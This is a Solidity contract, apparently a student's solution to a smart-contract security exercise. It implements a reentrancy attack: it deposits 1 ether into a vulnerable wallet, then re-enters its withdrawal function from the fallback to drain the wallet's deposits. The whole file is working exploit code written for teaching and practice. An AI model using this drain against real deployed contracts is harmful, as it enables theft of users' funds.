// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;


interface WalletI{
    // This is the interface of the wallet to be attacked. 
    function deposit() external payable;
    function sendTo(address payable dest) external;
}

contract WalletAttack{
    // A contract used to attack the Vulnerable Wallet.
    address public targetWallet;

    event msgData(address msgSender, address instanceAddr, uint value, string funcName);

   constructor() {
        // The constructor for the attacking contract. 
        // Do not change the signature
    }

    function exploit(WalletI _target) public payable{
        // runs the exploit on the target wallet. 
        // you should not deposit more than 1 Ether to the vulnerable wallet.
        // Assuming the target wallet has more than 3 Ether in deposits,
        // you should withdraw at least 3 Ether from the wallet.

//        emit msgData(msg.sender, address(this), msg.value, "exploit");
        require(msg.value>=1 ether,"msg value should be at least 1 ether");
        targetWallet=address(_target);
        WalletI(targetWallet).deposit{value: 1 ether}();
        WalletI(targetWallet).sendTo(payable(this));
    }


    // you may add addtional functions and state variables as needed. 
    // TODO: see if you want to use targetWallet or msg.sender
    fallback() external payable{
//        emit msgData(msg.sender, address(this), msg.value, "fallback");
        if (msg.sender.balance >= 1) {
            WalletI(msg.sender).sendTo(payable(this));
        }
    }

    function getBalance() public view returns (uint){
        return address(this).balance;
    }

    function getAddress() public view returns (address){
        return address(this);
    }
}
